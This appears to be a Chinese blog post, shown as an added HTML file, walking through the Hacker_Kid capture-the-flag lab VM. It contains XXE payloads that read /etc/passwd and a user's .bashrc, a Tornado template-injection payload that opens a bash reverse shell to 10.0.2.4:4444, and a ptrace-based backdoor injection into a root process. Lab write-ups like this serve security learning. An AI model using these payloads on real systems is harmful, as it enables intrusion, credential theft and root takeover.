@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"topdayplus.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Hacker_Kid打靶记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hacker_Kid">
+<meta property="og:url" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/index.html">
+<meta property="og:site_name" content="Topday&#39;s Blog">
+<meta property="og:description" content="Hacker_Kid打靶记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/01.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/02.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/03.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/04.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/05.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/06.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/07.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/08.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/09.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/10.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/11.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/12.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/13.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/14.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/15.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/16.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/17.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/18.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/19.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/20.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/21.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/22.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/23.png">
+<meta property="og:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/24.png">
+<meta property="article:published_time" content="2022-12-01T13:18:17.000Z">
+<meta property="article:modified_time" content="2022-12-04T11:13:39.204Z">
+<meta property="article:author" content="Topday">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://topdayplus.github.io/2022/12/01/Hacker-Kid/01.png">
+
+
+<link rel="canonical" href="http://topdayplus.github.io/2022/12/01/Hacker-Kid/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://topdayplus.github.io/2022/12/01/Hacker-Kid/","path":"2022/12/01/Hacker-Kid/","title":"Hacker_Kid"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hacker_Kid | Topday's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Topday's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Topday"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Topday</p>
+  <div class="site-description" itemprop="description">For me, it has not yet been realized what the rest of one’s life, is my greatest encouragement.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/topdayplus" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;topdayplus" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://topdayplus.github.io/2022/12/01/Hacker-Kid/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Topday">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Topday's Blog">
+      <meta itemprop="description" content="For me, it has not yet been realized what the rest of one’s life, is my greatest encouragement.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hacker_Kid | Topday's Blog">
+      <meta itemprop="description" content="Hacker_Kid打靶记录">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hacker_Kid
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+  
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-12-01 21:18:17" itemprop="dateCreated datePublished" datetime="2022-12-01T21:18:17+08:00">2022-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-12-04 19:13:39" itemprop="dateModified" datetime="2022-12-04T19:13:39+08:00">2022-12-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BA%A2%E9%98%9F/" itemprop="url" rel="index"><span itemprop="name">红队</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.6k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">Hacker_Kid打靶记录</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p><strong>0x01 主机发现</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/01.png" class title="This is an example image">
+
+
+
+<p><strong>0x02 端口扫描</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.10</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/02.png" class title="This is an example image">
+
+
+
+<p><strong>0x03 服务识别</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p53,80,9999 -sV 10.0.2.10</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/03.png" class title="This is an example image">
+
+<p>可以看到53端口开放的服务是 domain，版本是BIND 9，这是一款DNS服务器，就是用来把域名解析到IP的。默认是开启53端口的TCP(用于同步记录)和UDP(用于解析域名)的，探测下UDP是否开启。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p53 -sU 10.0.2.10</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/04.png" class title="This is an example image">
+
+
+
+<p><strong>0x04 Web页面探测</strong></p>
+<p>访问开放的web服务</p>
+<img src="/2022/12/01/Hacker-Kid/05.png" class title="This is an example image">
+
+
+
+<p>各个标签点击后并无响应请求，右键查看源代码看到有注释的信息。</p>
+<img src="/2022/12/01/Hacker-Kid/06.png" class title="This is an example image">
+
+
+
+<p>提示我们用 GET 请求参数 page_no 去访问页面，但参数值范围不清楚，拿bp爆破下试试。</p>
+<img src="/2022/12/01/Hacker-Kid/07.png" class title="This is an example image">
+
+
+
+<p>可以看到 page_no 为21时响应不同，访问试试</p>
+<img src="/2022/12/01/Hacker-Kid/08.png" class title="This is an example image">
+
+
+
+<p>页面下面多了一行红色小字，提示有子域名存在后门漏洞，例如 hackers.blackhat.local 。那就先添加下本地域名解析。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加内容如下</span></span><br><span class="line">10.0.2.10 blackhat.local</span><br><span class="line">10.0.2.10 hackers.blackhat.local</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>0x05 DNS区域传输</strong></p>
+<p>访问 hackers.blackhat.local 试试</p>
+<img src="/2022/12/01/Hacker-Kid/09.png" class title="This is an example image">
+
+
+
+<p>提示信息一直说 DIG me more。补充下，DIG工具是Linux上用于查询DNS解析记录的，而刚才服务识别也发现了 53 端口开放着 DNS 服务器，那就来 DIG 一下吧。</p>
+<img src="/2022/12/01/Hacker-Kid/10.png" class title="This is an example image">
+
+
+
+<p>可以看到查询到了更多的域名解析记录，把相关子域名都加入hosts文件解析。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加内容如下</span></span><br><span class="line">10.0.2.10       hackers.blackhat.local</span><br><span class="line">10.0.2.10       blackhat.local</span><br><span class="line">10.0.2.10       hackerkid.blackhat.local</span><br><span class="line">10.0.2.10       ns1.blackhat.local</span><br><span class="line">10.0.2.10       mail.blackhat.local</span><br><span class="line">10.0.2.10       hacker.blackhat.local.blackhat.local</span><br></pre></td></tr></table></figure>
+
+
+
+<p>前面扫描端口时开放了 80 和 9999 端口，那就对新增的这几个子域名逐个访问，发现了一个登录页，一个注册页，但显然不是同一个功能。</p>
+<img src="/2022/12/01/Hacker-Kid/11.png" class title="This is an example image">
+
+<img src="/2022/12/01/Hacker-Kid/12.png" class title="This is an example image">
+
+
+
+<p><strong>0x06 XXE注入攻击 &amp; PHP封装器</strong></p>
+<p>现在我们啥没有，直接注册试试。发现响应信息有这么个特点，无论输入什么，都提示<strong>邮箱不合法</strong>，并把<strong>邮箱信息打印</strong>出来。而且数据传输格式是 xml。这就想起了 XXE 漏洞，猜测后台就是解析用户 xml 信息并打印邮箱信息。</p>
+<img src="/2022/12/01/Hacker-Kid/13.png" class title="This is an example image">
+
+
+
+<p>XXE 测试，注入点是邮箱信息</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/14.png" class title="This is an example image">
+
+
+
+<p>可以看到有个 saket 用户有 bash权限，那就尝试用 XXE 读取 saket 相关的文件。尝试读取默认的<strong>SSH公私钥文件</strong>（.ssh&#x2F;authorized_keys），无果。多番尝试后读取了目录下的 .bashrc 文件，读取过程中需要 <strong>base64 编码</strong>将文件信息带出，可能是系统默认识别为执行代码，编码带出则为文本。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/15.png" class title="This is an example image">
+
+
+
+<p><strong>0x07 SSTI模板注入</strong></p>
+<p>解码后的文件中有个账号密码，还记得我们之前有个登录页面吗，尝试登录，失败！！！</p>
+<img src="/2022/12/01/Hacker-Kid/16.png" class title="This is an example image">
+
+
+
+<p>观察了一下，这密码是 <strong>Saket!#$%@!!</strong> ，那对应的账号会不会是 saket 而不是 admin，成功登录！！！</p>
+<img src="/2022/12/01/Hacker-Kid/17.png" class title="This is an example image">
+
+
+
+<p>看到登录后的页面通过获取 GET 传入的 name 参数，直接显示在页面上，会不会存在 <strong>SSTI 模板注入</strong>漏洞。现在各种开发语言如：JAVA(velocity 模板等)、PHP(Smarty 模板等)、Python(Tornado 模板等)，都存在后端进行前端模板渲染，这期间如果没做过滤，就可能存在对应模板的任意表达式执行。</p>
+<p>根据前面 nmap 服务识别可知，服务端用的是 <strong>Tornado</strong> 模板，先尝试用通用渲染方式探测是否存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;%3C%1+abcxyz%%3E[abcxyz]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>看到报错，说明确实解析到了，存在漏洞</p>
+<img src="/2022/12/01/Hacker-Kid/18.png" class title="This is an example image">
+
+
+
+<p>测试解析占位符格式，哪种形式的参数被解析</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/19.png" class title="This is an example image">
+
+
+
+<p>可以看到第二种解析形式被成功解析，则注入表达式要在两重括号内。表达式的敏感字符默认会被过滤，需要对 **{ %**，做URL编码，详细编码如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/4444 0&gt;&amp;1&quot;&#x27;)&#125;&#125;  #表达式内容作编码</span><br></pre></td></tr></table></figure>
+
+<p>把需要被表达式解析的{}、()、%、空格、’’、””全部做 url 编码，相关参数的 . 符号就不用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7b%25%20import%20os%20%25%7d%7b%7bos.system%28%27bash%20-c%20%22bash%20-i%20%3e%26 %2fdev%2ftcp%2f10.0.2.4%2f4444%200%3e%261%22%27%29%7d%7d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>拿到了 saket 账户的 shell，还需要一波提权。</p>
+<img src="/2022/12/01/Hacker-Kid/20.png" class title="This is an example image">
+
+
+
+<p><strong>0x08 Capabilitie提权</strong></p>
+<p>把寻常的提权方式试一遍：</p>
+<ol>
+<li>unam -a 内核提权</li>
+<li>sudo -l  查看是否有 sudo 权限配置不当</li>
+<li>是否有 suid、sgid 设置不当的文件</li>
+</ol>
+<p>都没有找到，实在头大。秉着绝大多数提权都是权限相关的操作管理不当，继续找权限配置相关的操作，想到了 Capabilitie 这个 Linux下的权限管理机制。</p>
+<p>Capabilitie 是从Linux 内核2.2开始引入的，简单来说就是更细致的权限划分，比如 Wireshark 抓包，并非赋予整个程序抓取底包的权限，而是单独把抓取网络原始数据的能力赋予 Wireshark 进程。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admim=eip /usr/bin/dumpcap  <span class="comment">#赋予 cap_net_raw、cap_net_admim能力</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#详细可参考：https://man7.org/linux/man-pages/man7/capabilities.7.html</span><br></pre></td></tr></table></figure>
+
+
+
+<p>秉着这个思路，看是否有 Capabilitie 配置不当的权限。查看当前 Capabilitie 配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null <span class="comment">#递归查询</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/21.png" class title="This is an example image">
+
+
+
+<p>可以看到 python2 有  cap_sys_ptrace+ep 权限点，这个是一个调试程序相关的权限，这种涉及底层的权限大多是高权限，则可以利用 python2 的注入来实现提权。先查看以 root 运行的程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -U root  <span class="comment">#随便选个 root 程序，这里选了apache服务，线程号801</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/22.png" class title="This is an example image">
+
+
+
+<p>注入脚本 inject.py，参考如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/zlgxzswjy/p/15185591.html</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行注入脚本，会把后门注入到801这个服务中，然后默认开启5600服务，以供远程连接：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2<span class="number">.7</span> inject.py <span class="number">801</span>   <span class="comment">#注入后门</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/23.png" class title="This is an example image">
+
+
+
+<p>远程连接后门：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.0.2.10 5600  <span class="comment">#远程连接</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/24.png" class title="This is an example image">
+    </div>
+
+    
+    
+    
+	
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Topday
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://topdayplus.github.io/2022/12/01/Hacker-Kid/" title="Hacker_Kid">http://topdayplus.github.io/2022/12/01/Hacker-Kid/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%89%93%E9%9D%B6/" rel="tag"># 打靶</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/23/EvilBox-One/" rel="prev" title="EvilBox_One">
+                  <i class="fa fa-chevron-left"></i> EvilBox_One
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/12/11/%E5%91%A8%E6%97%A5%E6%99%9A%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5/" rel="next" title="周日晚的碎碎念">
+                  周日晚的碎碎念 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Topday</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">266k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:02</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
